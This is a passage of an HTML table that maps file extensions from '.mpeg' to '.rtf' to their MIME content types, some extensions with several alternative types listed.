<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">video/mpeg</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.mpeg</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">video/mpeg</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.mpg</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">audio/mpeg</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.mpg</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">video/mpeg</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.mpga</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">audio/mpeg</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.mpp</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/vnd.ms-project</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.mpt</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-project</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.mpv</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-project</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.mpx</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-project</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.mrc</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/marc</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.ms</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-troff-ms</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.mv</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">video/x-sgi-movie</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.my</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">audio/make</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.mzz</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-vnd.audioexplosion.mzz</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.nap</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">image/naplps</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.naplps</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">image/naplps</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.nc</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-netcdf</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.ncm</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/vnd.nokia.configuration-message</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.nif</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">image/x-niff</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.niff</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">image/x-niff</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.nix</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-mix-transfer</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.nsc</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-conference</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.nvd</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-navidoc</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.o</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/octet-stream</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.oda</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/oda</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.omc</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-omc</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.omcd</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-omcdatamaker</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.omcr</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-omcregerator</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.p</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/x-pascal</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.p10</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/pkcs10</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.p10</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-pkcs10</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.p12</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/pkcs-12</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.p12</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-pkcs12</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.p7a</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-pkcs7-signature</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.p7c</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/pkcs7-mime</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.p7c</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-pkcs7-mime</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.p7m</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/pkcs7-mime</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.p7m</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-pkcs7-mime</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.p7r</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-pkcs7-certreqresp</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.p7s</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/pkcs7-signature</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.part</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/pro_eng</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.pas</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/pascal</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.pbm</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">image/x-portable-bitmap</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.pcl</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/vnd.hp-pcl</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.pcl</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-pcl</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.pct</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">image/x-pict</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.pcx</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">image/x-pcx</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.pdb</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">chemical/x-pdb</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.pdf</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/pdf</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.pfunk</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">audio/make</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.pfunk</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">audio/make.my.funk</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.pgm</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">image/x-portable-graymap</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.pgm</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">image/x-portable-greymap</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.pic</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">image/pict</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.pict</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">image/pict</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.pkg</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-newton-compatible-pkg</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.pko</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/vnd.ms-pki.pko</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.pl</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/plain</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.pl</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/x-script.perl</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.plx</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-pixclscript</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.pm</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">image/x-xpixmap</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.pm</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/x-script.perl-module</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.pm4</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-pagemaker</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.pm5</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-pagemaker</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.png</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">image/png</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.pnm</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-portable-anymap</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.pnm</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">image/x-portable-anymap</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.pot</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/mspowerpoint</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.pot</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/vnd.ms-powerpoint</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.pov</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">model/x-pov</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.ppa</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/vnd.ms-powerpoint</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.ppm</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">image/x-portable-pixmap</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.pps</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/mspowerpoint</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.pps</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/vnd.ms-powerpoint</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.ppt</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/mspowerpoint</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.ppt</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/powerpoint</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.ppt</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/vnd.ms-powerpoint</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.ppt</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-mspowerpoint</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.ppz</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/mspowerpoint</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.pre</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-freelance</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.prt</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/pro_eng</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.ps</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/postscript</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.psd</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/octet-stream</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.pvu</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">paleovu/x-pv</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.pwz</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/vnd.ms-powerpoint</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.py</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/x-script.phyton</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.pyc</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-bytecode.python</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.qcp</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">audio/vnd.qcelp</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.qd3</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">x-world/x-3dmf</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.qd3d</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">x-world/x-3dmf</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.qif</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">image/x-quicktime</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.qt</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">video/quicktime</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.qtc</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">video/x-qtc</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.qti</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">image/x-quicktime</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.qtif</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">image/x-quicktime</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.ra</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">audio/x-pn-realaudio</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.ra</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">audio/x-pn-realaudio-plugin</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.ra</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">audio/x-realaudio</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.ram</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">audio/x-pn-realaudio</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.ras</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-cmu-raster</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.ras</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">image/cmu-raster</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.ras</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">image/x-cmu-raster</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.rast</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">image/cmu-raster</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.rexx</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/x-script.rexx</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.rf</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">image/vnd.rn-realflash</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.rgb</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">image/x-rgb</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.rm</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/vnd.rn-realmedia</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.rm</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">audio/x-pn-realaudio</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.rmi</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">audio/mid</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.rmm</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">audio/x-pn-realaudio</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.rmp</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">audio/x-pn-realaudio</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.rmp</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">audio/x-pn-realaudio-plugin</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.rng</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/ringing-tones</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.rng</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/vnd.nokia.ringing-tone</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.rnx</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/vnd.rn-realplayer</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.roff</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-troff</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.rp</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">image/vnd.rn-realpix</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.rpm</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">audio/x-pn-realaudio-plugin</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.rt</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/richtext</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.rt</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/vnd.rn-realtext</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.rtf</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/rtf</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.rtf</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-rtf</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.rtf</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/richtext</span></td>
